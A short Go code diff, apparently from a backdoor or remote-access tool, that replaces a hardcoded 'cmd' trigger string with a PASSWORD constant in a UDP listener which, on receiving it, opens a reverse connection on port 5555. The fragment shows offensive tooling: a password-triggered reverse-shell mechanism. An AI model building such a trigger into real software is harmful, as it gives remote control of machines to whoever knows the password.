@@ -28,6 +28,8 @@ const (
 	UDPREVERSEPORT = "5555"
 	// HTTPPORT is the port on which the httpserver is going to be mounted
 	HTTPPORT = "4444"
+	// PASSWORD is the password to enter in order to start the reverse connection.
+	PASSWORD = "cmd"
 )
 
 func main() {
@@ -376,7 +378,7 @@ func UDPBind() {
 		data := commands[0]
 		//data := strings.TrimSpace(string(message[:rlen]))
 		fmt.Printf("received: %s from %s\n", data, remoteaddr)
-		if data == "cmd" {
+		if data == PASSWORD {
 			var port string
 			if len(commands) == 1 {
 				port = UDPREVERSEPORT
